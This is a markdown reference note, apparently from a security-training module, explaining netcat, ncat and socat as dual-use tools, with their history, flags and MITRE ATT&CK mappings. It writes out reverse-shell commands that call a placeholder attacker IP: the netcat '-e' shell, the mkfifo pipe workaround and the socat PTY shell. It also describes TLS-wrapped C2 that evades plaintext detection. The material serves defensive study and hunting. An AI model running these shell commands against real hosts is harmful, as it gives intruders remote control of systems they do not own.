# LOLBins — Netcat / Ncat / Socat — Overview

> 🔴 **Red Flag Principle:** These three tools are grouped in one folder because they're the same capability at three points on a maturity curve — a raw TCP/UDP socket pipe (netcat), the same idea with TLS/proxy/relay features bolted on (Nmap's `ncat`), and a fully generalized bidirectional-stream relay with dozens of address types (`socat`) — but they share the single most important evidentiary trait for a defender: **the shell they spawn is a child process of the network tool itself, on whichever host is listening.** A `cmd.exe`, `powershell.exe`, `/bin/sh`, or `/bin/bash` process whose parent is `nc.exe`, `ncat.exe`, or `socat` is a process-tree relationship that almost never occurs legitimately — that parent-child pairing survives binary rename, survives recompilation from source, and survives TLS wrapping, making it the strongest single hunting signal in this note even though none of these three binaries appear anywhere in the LOLBAS Project's catalog (verified live — see History below). The second thing to hold onto: **many current netcat builds ship without `-e` compiled in on purpose** (Debian's own patch calls it `-DGAPING_SECURITY_HOLE`), which is exactly why the `mkfifo`-based no-`-e` workaround and `socat`'s far richer `EXEC:...,pty` construction exist — don't assume `-e` is available just because a host has "netcat."

## Contents
- [History](#history)
- [How It Works](#how-it-works)
- [Techniques / Protocols Used](#techniques--protocols-used)
- [Command-Line Switches — Quick Reference](#command-line-switches--quick-reference)
- [Quick Use-Case List](#quick-use-case-list)
- [Prerequisites](#prerequisites)

---

## History

**These three tools have zero presence in the LOLBAS Project's catalog.** Verified live against the full `LOLBAS-Project/LOLBAS` GitHub repository tree (every file under `yml/`, `Archive-Old-Version/`, all five category directories): no `Netcat.yml`, `Nc.yml`, `Ncat.yml`, or `Socat.yml` exists, and a full-tree search for `nc`/`ncat`/`socat` substrings returns nothing on-topic (only unrelated hits like `Syncappvpublishingserver.yml`). This is structurally consistent with LOLBAS's own scoping rule — the project only catalogs Microsoft-authored or OS-shipped binaries — and mirrors this module's earlier finding for `../winrar/`: a genuinely third-party, cross-platform tool that is nonetheless a real dual-use LOLBIN by every other measure. Abuse documentation for this note is instead sourced from MITRE ATT&CK's technique and detection-strategy library (verified live against attack.mitre.org, cited throughout).

**Classic netcat.** The original netcat was written by a pseudonymous author known as **`Hobbit`** (`hobbit@avian.org`), first released **1995-10-28**, with the final canonical release — **version 1.10** — in **March 1996** under a custom, permissive license. Hobbit never resumed development after 1.10, and despite the tool's enormous popularity, the original codebase itself was never officially picked up by a new maintainer (per Wikipedia's netcat history, cross-referenced against the SourceForge-mirrored `nc110.tgz` source archive). Two independent rewrites carry the name forward:
- **GNU netcat** — a GPL-licensed, more portable rewrite; last released as version 0.7.1 in 2004 and not actively maintained since.
- **OpenBSD netcat** (`nc`) — a from-scratch rewrite maintained as part of the OpenBSD base system, BSD-licensed, and the version most current Linux distributions and macOS actually ship as `/usr/bin/nc` today (often via a Debian- or distro-specific patch layer). It adds **IPv6 and native TLS support** and has been ported to FreeBSD, Windows/Cygwin, and Linux — but, critically for this note, **does not implement `-e`/`-c` at all**, having deliberately dropped it. `Cryptcat` is a separate, older fork that bolts on Twofish transport encryption rather than TLS.
- **Windows ports.** The classic Hobbit-lineage source has long been cross-compiled for Windows (commonly circulated as `nc.exe`/`nc111nt.exe`), and because these Windows builds were never subject to the Debian-specific `GAPING_SECURITY_HOLE` compile-time patch described below, **`-e` is typically present and enabled in the Windows `nc.exe` binaries an operator is likely to find or drop on a target** — this is a real, verifiable-per-binary distinction from the increasingly `-e`-less POSIX landscape, not a universal rule; always confirm against the specific binary in hand rather than assuming.

**The `-e`/`GAPING_SECURITY_HOLE` story.** `-e <program>` binds a program's stdin/stdout directly to the network socket — the single flag that turns netcat into a one-line reverse or bind shell. Most current POSIX distributions ship netcat **compiled without `-e`** specifically to close what the traditional-netcat source itself calls, in its own compile-time macro, `GAPING_SECURITY_HOLE` — Debian's traditional-netcat package is the most commonly cited example, and OpenBSD's rewrite never implemented the flag in the first place. Recompiling from source with `-DGAPING_SECURITY_HOLE` re-enables it. This is precisely why the `mkfifo`-based workaround in `02 - Hands-On Use Cases.md` exists as standard tradecraft rather than a niche trick — verify which `-e` story applies to whichever specific binary is in play before planning around it.

**Ncat.** Announced by the Nmap Project in **mid-2005** and shipped as part of the Nmap suite (author credits per the current [Nmap Ncat Reference Guide](https://nmap.org/book/ncat-man.html): Chris Gibson, Gordon "Fyodor" Lyon, Kris Katterjohn, and Mixter, building on the original Netcat's design). Per the project's own framing (quoted via Wikipedia's netcat article): *"While Ncat isn't built on any code from the 'traditional' Netcat (or any other implementation), Ncat is most definitely based on Netcat in spirit and functionality."* Ncat is a clean-room reimplementation that adds native TLS (`--ssl`), SOCKS4/SOCKS5/HTTP proxy support, connection brokering, and a chat-relay mode — see How It Works below.

**Socat.** Written by **Gerhard Rieger**, first released in **1999** as a deliberately more general successor to netcat's single-TCP-socket model — Wikipedia's description: *"a more complex variant of netcat"* that is *"larger and more flexible."* Where netcat/ncat connect two fixed endpoint types (a socket and a program/stdio), socat generalizes both ends into a large catalog of independently combinable **address types** (see How It Works) — this generality is what makes it the tool of choice for fully-interactive PTY shells, arbitrary protocol relaying, and pivot chaining that plain netcat can't express. **A documented caveat worth knowing before relying on socat's OpenSSL support for anything sensitive:** in 2016, security researchers disclosed **CVE-2016-2217** — socat versions 1.7.3.0 and 2.0.0-b8 shipped a hardcoded 1024-bit Diffie-Hellman modulus for the `OPENSSL` address type that a January 2015 contributed patch had introduced as **non-prime** (a 1024-bit composite number, not a prime, breaking the security assumptions of the DH exchange). Whether the flaw was an honest cryptographic-review failure or an intentionally planted weakness was never conclusively resolved, but it is a real, patched historical vulnerability in the exact address type this note's PTY-shell TLS-wrapping use cases would rely on — a good reminder to keep any socat build used for sensitive engagements current.

## How It Works

**1. The universal netcat model — pipe a program to a socket.** At its simplest, every one of these three tools does the same thing: connect (or listen for) a TCP/UDP/other-transport socket, then relay bytes bidirectionally between that socket and *something* — by default, the tool's own stdin/stdout (making it composable with shell pipes), or, when told to, a spawned program's stdin/stdout instead.

```
Reverse shell — classic netcat, target-initiated outbound connection:

  ATTACKER HOST                                    TARGET HOST
  nc -lvnp 4444  (listener, waiting)                already has code execution

                        TCP SYN to attacker:4444
       ◀─────────────────────────────────────────  nc <attacker_ip> 4444 -e /bin/sh
                                                            │
                                                            └─▶ /bin/sh spawned,
                                                                stdin/stdout/stderr
                                                                bound directly to
                                                                the socket
  attacker's nc process now has an interactive
  (but NOT pty-backed — see caveat below) shell
```

**2. Why the shell from plain `-e` (or the `mkfifo` equivalent) is non-interactive.** `-e` wires a spawned shell's stdio directly to a raw socket — there is no pseudo-terminal (PTY) allocated anywhere in that chain. This is why classic netcat/ncat reverse shells can't run full-screen interactive programs (`vim`, `top`, `sudo` password prompts, tab-completion, Ctrl-C handling that only kills the remote process rather than the local netcat listener) — the remote shell has no controlling terminal, just two raw file descriptors. This single limitation is the entire reason `socat`'s PTY-capable `EXEC:` address type (see point 4) is preferred whenever full interactivity matters.

**3. The no-`-e` workaround — named pipes.** Where the target's netcat build has no `-e` (OpenBSD `nc`, or any traditional build compiled without `-DGAPING_SECURITY_HOLE`), the same effect is reconstructed with a named pipe (`mkfifo`) gluing a shell's output back into the same `nc` process's input:

```sh
rm -f /tmp/f; mkfifo /tmp/f
/bin/sh -i 2>&1 </tmp/f | nc <attacker_ip> <port> >/tmp/f
```

`mkfifo` creates a bidirectional named pipe on disk; the shell's stdin reads from it, its stdout+stderr (`2>&1`) feed into `nc`'s stdin, and `nc`'s stdout is redirected back into the same pipe — closing the loop without ever needing a `-e`-equivalent flag. Functionally identical output to `-e`, but it requires write access to create the FIFO and leaves that FIFO as a disk artifact (see `04 - Target Evidence.md`).

**4. Socat's address-type engine and the fully-interactive PTY pattern.** Socat has no fixed notion of "client" and "server" the way netcat does — every invocation is `socat <address1> <address2>`, and *either* address can independently be a `TCP`/`UDP`/`UNIX` socket, a `PTY`, an `EXEC:`/`SYSTEM:` spawned program, `STDIO`, `OPENSSL`, `GOPEN` (a generic file/device opener), or dozens of other types, each with its own comma-separated option list. The flagship reverse-shell construction pairs a TCP connection with an `EXEC:` address that explicitly allocates a PTY for the spawned shell:

```sh
# Target (reconnects out to the attacker):
socat TCP:<attacker_ip>:<port> EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane

# Attacker (listener side — also wants a PTY for its own terminal to behave correctly):
socat TCP-LISTEN:<port>,fork - 
# or, for a matching fully-interactive receiving end:
socat file:`tty`,raw,echo=0 TCP-LISTEN:<port>
```

Breaking down the `EXEC:` options, verified against socat's own documentation:
| Option | Effect |
|---|---|
| `pty` | Allocates a pseudo-terminal for the spawned process instead of raw pipes — this is what makes the shell genuinely interactive (tab-completion, `^C` behaves correctly, full-screen programs render) |
| `stderr` | Merges the subprocess's stderr into the same output channel as stdout, so error messages are visible remotely |
| `setsid` | Makes the subprocess the leader of a new session — detaches it from any existing controlling terminal |
| `ctty` | Makes the allocated PTY the subprocess's controlling terminal |
| `sigint` / `sighup` / `sigquit` | Forwards the corresponding signal to the subprocess rather than letting it affect `socat` itself |
| `sane` | Convenience shorthand that resets terminal driver settings to a sane default (equivalent to running `stty sane`) |
| `raw`, `echo=0` | Used on the listener side to put the operator's own local terminal into raw mode with echo suppressed, so keystrokes aren't double-echoed |

This is the single biggest capability gap between plain netcat/ncat and socat covered in this note: **socat's PTY allocation is what actually defeats the "non-interactive shell" limitation described in point 2** — `-e` alone, no matter which netcat/ncat build has it, never allocates a PTY.

**5. Ncat's added machinery — TLS, proxying, brokering.** Ncat wraps the same core connect/listen/pipe model in extra layers that plain netcat has no equivalent for:
- `--ssl` wraps the connection in TLS. In listen mode, if no `--ssl-cert`/`--ssl-key` is supplied, **Ncat automatically generates a temporary, ephemeral self-signed 2048-bit RSA certificate for that session** (per Nmap's own [Ncat SSL guide](https://nmap.org/ncat/guide/ncat-ssl.html)) — zero extra operator effort to stand up an encrypted listener that defeats plaintext-signature-based network detection. **Socat's equivalent `OPENSSL`/`OPENSSL-LISTEN` address type has no such convenience — it requires an explicit `cert=<file>` the operator must generate themselves ahead of time**, or the connection simply fails to establish. This is a real, verifiable asymmetry worth carrying into `05 - Detection and Hunting.md`: Ncat's default TLS listener has a predictable, tool-generated certificate an analyst can potentially fingerprint across engagements; socat's does not, by design, but costs the operator extra setup.
- `--proxy`/`--proxy-type` lets Ncat itself connect out through an HTTP, SOCKS4, or SOCKS5 proxy rather than directly — useful for routing a connect-back through infrastructure that already looks like ordinary proxied traffic.
- `--broker` puts Ncat into a mode that relays traffic **between multiple simultaneously-connected clients** rather than to a single spawned program — effectively a lightweight, ad hoc relay/rendezvous point.
- `--chat` is a specialized broker variant that additionally line-buffers and prefixes messages, turning the same relay into a simple multi-client text chat server — occasionally repurposed as a crude C2 rendezvous/beaconing channel precisely because its traffic shape doesn't resemble a typical reverse shell.

## Techniques / Protocols Used

| Layer | Detail |
|---|---|
| MITRE technique (raw socket C2) | [T1095 — Non-Application Layer Protocol](https://attack.mitre.org/techniques/T1095/), tactic **Command and Control** — MITRE's own **Ember Bear (G1003)** entry names netcat explicitly: *"socket-based tunneling utilities for command and control purposes such as NetCat and Go Simple Tunnel (GOST)"* |
| MITRE technique (execution) | [T1059.003 — Windows Command Shell](https://attack.mitre.org/techniques/T1059/003/) / [T1059.004 — Unix Shell](https://attack.mitre.org/techniques/T1059/004/), depending on which shell is spawned as the payload |
| MITRE technique (relay/pivot/proxy) | [T1090.001 — Internal Proxy](https://attack.mitre.org/techniques/T1090/001/) — MITRE's own detection-strategy guidance for this technique names these exact tools: *"socat, ssh, iptables, or ncat invoked from user space or cron jobs to create port forwarding, reverse shells, or inter-host tunnels between compromised Linux systems"*, and separately for ESXi: *"tools/scripts (nc, socat, perl) relaying network traffic to other internal hosts"* |
| MITRE technique (tunneling) | [T1572 — Protocol Tunneling](https://attack.mitre.org/techniques/T1572/) — MITRE's detection-strategy guidance names socat again: *"sshd, socat, or custom binaries initiating port forwarding or encapsulating traffic (e.g., RDP, SMB) through SSH or HTTP"* |
| MITRE technique (non-standard port) | [T1571 — Non-Standard Port](https://attack.mitre.org/techniques/T1571/) — no named procedure example for these tools specifically, but directly applicable since none of the three enforce any particular port |
| MITRE technique (ingress transfer) | [T1105 — Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) — applicable to the file-transfer use cases in `02`, though MITRE's own documented procedure examples for this technique favor `curl`/`wget`/`certutil` rather than naming netcat directly |
| Transport | TCP, UDP (all three); additionally UNIX domain sockets, SCTP, and `AF_VSOCK` for Ncat specifically; socat generalizes further still (PTY, EXEC, pipes, arbitrary file descriptors) |
| Encryption | None by default for classic netcat (plaintext). Ncat: `--ssl` (TLS, auto-ephemeral cert on listen). Socat: `OPENSSL`/`OPENSSL-LISTEN` address type (requires an operator-supplied cert) |
| Process model | The listening or connecting instance of `nc`/`ncat`/`socat` is the **direct parent process** of any shell/program it executes (`-e`/`-c`/`EXEC:`) — this parent-child relationship is the core forensic signature this note builds hunting guidance around |
| Binary location | No fixed OS-enforced install path for any of the three — genuinely portable, third-party binaries that can be dropped or compiled anywhere the operator has write access |

## Command-Line Switches — Quick Reference

Verified against the [Nmap Ncat Reference Guide](https://nmap.org/book/ncat-man.html) and socat's official documentation/man page (`dest-unreach.org/socat`). Classic netcat's exact flag set varies meaningfully by build (Hobbit-lineage vs. GNU netcat vs. OpenBSD `nc`) — the table below covers the common cross-build core plus build-specific notes where they diverge.

**Classic netcat (`nc`) — common core flags**

| Switch | Plain-English meaning |
|---|---|
| `-l` | Listen mode — wait for an incoming connection instead of initiating one |
| `-p <port>` | Local port to bind to (some builds fold this into a positional argument instead) |
| `-v` / `-vv` | Verbose / more-verbose console output |
| `-n` | Skip DNS resolution — numeric IPs only, faster and quieter on the wire |
| `-z` | Zero-I/O mode — connect (or scan) and immediately close, reporting only whether the port responded. This is netcat's port-scanning/banner-grab primitive |
| `-w <secs>` | Connection/idle timeout |
| `-u` | Use UDP instead of TCP |
| `-e <program>` | **Bind `<program>`'s stdin/stdout to the connected socket** — the reverse/bind-shell primitive. **Not present in OpenBSD `nc`; frequently compiled out (`GAPING_SECURITY_HOLE`) on other POSIX builds; commonly present and enabled in Windows `nc.exe` ports** — verify per-binary, do not assume |
| `-k` | (GNU/OpenBSD builds) Keep the listener open to accept further connections after the current one closes, instead of exiting |
| `-4` / `-6` | Force IPv4 / IPv6 |

**Ncat (`ncat`) — adds to the above**

| Switch | Plain-English meaning |
|---|---|
| `-e, --exec <command>` | Same primitive as classic `-e` |
| `-c, --sh-exec <command>` | Same idea, but runs `<command>` through `/bin/sh -c` first, so shell metacharacters/pipes in the command string work |
| `--ssl` | Wrap the connection in TLS. Listener with no `--ssl-cert`/`--ssl-key` auto-generates a temporary self-signed cert for that session |
| `--ssl-cert <file>` / `--ssl-key <file>` | Supply a specific certificate/key instead of the ephemeral default |
| `--ssl-verify` / `--ssl-trustfile <file>` | Enable and configure peer-certificate verification |
| `--proxy <host[:port]>` / `--proxy-type <http\|socks4\|socks5>` | Connect out through a proxy rather than directly |
| `--broker` | Relay traffic between multiple simultaneously-connected clients rather than to one spawned program |
| `--chat` | Line-buffered multi-client chat-relay variant of `--broker` |
| `-k, --keep-open` | Accept multiple sequential connections rather than exiting after the first |
| `-m, --max-conns <n>` | Cap concurrent connections (default 100, 60 on Windows) |
| `--allow <host>` / `--deny <host>` (+`file` variants) | IP-based access control on who may connect to a listener |
| `-o, --output <file>` / `-x, --hex-dump <file>` | Log session data to disk, raw or hex-dumped |
| `--send-only` / `--recv-only` | Restrict the relay to one direction only |
| `-C, --crlf` | Convert bare LF to CRLF on output — useful for talking to line-oriented text protocols |

**Socat — address-type syntax (`socat <address1> <address2>`)**

| Address / option | Plain-English meaning |
|---|---|
| `TCP:<host>:<port>` / `TCP-LISTEN:<port>` | Connect to / listen on a TCP endpoint |
| `UDP:<host>:<port>` / `UDP-LISTEN:<port>` | Same, over UDP |
| `UNIX-CONNECT:<path>` / `UNIX-LISTEN:<path>` | UNIX domain socket endpoint |
| `EXEC:'<command>'` | Spawn `<command>`, wiring its stdio to the other address |
| `SYSTEM:'<command>'` | Like `EXEC`, but runs the command through a shell first (metacharacters/pipes work) |
| `STDIO` | The operator's own terminal stdin/stdout |
| `PTY` | Allocate a pseudo-terminal as one endpoint |
| `GOPEN:<path>` | "Generic open" — auto-detects and opens a file, device, or other filesystem object appropriately |
| `OPENSSL:<host>:<port>` / `OPENSSL-LISTEN:<port>` | TLS-wrapped TCP; requires `cert=<file>` on the listening side |
| `fork` | (option on a `*-LISTEN` address) Spawn a new child process to handle each accepted connection, keeping the listener itself alive for more |
| `reuseaddr` | (option) Allow immediate re-binding to a port still in `TIME_WAIT` |
| `pty,stderr,setsid,sigint,sane` | (options on an `EXEC:`/`SYSTEM:` address) The fully-interactive-shell option bundle — see How It Works, point 4 |
| `-d` (repeatable up to `-dddd`) | Increase verbosity |
| `-lf <file>` | Write socat's own log messages to `<file>` instead of stderr |
| `-T <secs>` | Total inactivity timeout — terminate if nothing happens for this long |

## Quick Use-Case List

- Legacy `-e` reverse shell — target connects out to an attacker-held listener (classic netcat, or a Windows `nc.exe` build with `-e` compiled in)
- No-`-e` reverse shell via the `mkfifo` named-pipe workaround (OpenBSD `nc`, or any build compiled without `GAPING_SECURITY_HOLE`)
- Bind shell — target listens, attacker connects in
- Ncat `--exec`/`--sh-exec` execution — same primitive with Ncat's added TLS/proxy machinery available
- Ncat `--ssl` encrypted C2 channel — defeats plaintext-signature-based network detection, ephemeral self-signed cert with zero extra setup
- Socat fully-interactive PTY reverse/bind shell (`EXEC:...,pty,stderr,setsid,sigint,sane`) — the only construction of the three that produces a genuinely full-featured remote terminal
- File transfer — download (listener writes received bytes to a file)
- File transfer — upload (client streams a local file's bytes out to a listener)
- Port scanning / service banner grabbing (`-zv`) — legitimate recon primitive, also a pre-attack reconnaissance step
- Relay / pivot chaining — two `nc`/`socat` processes glued together (via `mkfifo` or socat's `fork`) to bridge an attacker to a host with no direct route
- Ncat proxy chaining (`--proxy`) — routing the connect-back through an HTTP/SOCKS proxy
- Ncat broker/chat relay mode — multi-client rendezvous point whose traffic shape doesn't resemble a typical single reverse shell
- UDP-based variant of any of the above, where a UDP-only egress path exists but TCP doesn't
- Fleet-wide/mass listener push — the same bind-shell or beacon command deployed identically across many already-compromised hosts via C2 tasking
- Legitimate-baseline sysadmin use — banner grabbing, ad hoc file transfer, and quick connectivity/port testing during normal troubleshooting (this module's SEC560 sourcing note lists netcat explicitly for exactly these legitimate purposes)

Full walkthroughs with commands and MITRE ATT&CK mapping for every item above live in `02 - Hands-On Use Cases.md`.

## Prerequisites

| Requirement | Notes |
|---|---|
| Code execution on at least one host | For reverse/bind shells, code execution is needed on the target; a listener alone (attacker side) requires nothing on the target beyond network reachability |
| A copy of `nc`/`ncat`/`socat` present or deliverable | None of the three ship as a guaranteed OS-default the way certutil/wmic do — confirm what's already installed, or plan to drop/compile a portable copy (see `02`'s delivery-mechanism note) |
| Correct build/variant for the intended technique | `-e` availability depends entirely on which specific binary is present — see History. Socat's PTY interactivity has no netcat/ncat equivalent regardless of build |
| Network reachability | Outbound (reverse shell/beacon) or inbound (bind shell) connectivity on whichever port is chosen — none of these tools have a fixed default port |
| `mkfifo`/shell scripting support | Required only for the no-`-e` workaround; trivially available on any POSIX shell, not natively available in `cmd.exe` (PowerShell can approximate it differently, out of scope for this note) |
| Privilege level | User-level is sufficient for every use case in this note unless binding to a privileged port (<1024 on POSIX systems) is specifically required |
| Certificate material (Ncat/socat TLS use cases only) | Ncat generates its own ephemeral cert automatically; socat's `OPENSSL`/`OPENSSL-LISTEN` requires the operator to supply `cert=<file>` ahead of time — no built-in fallback |
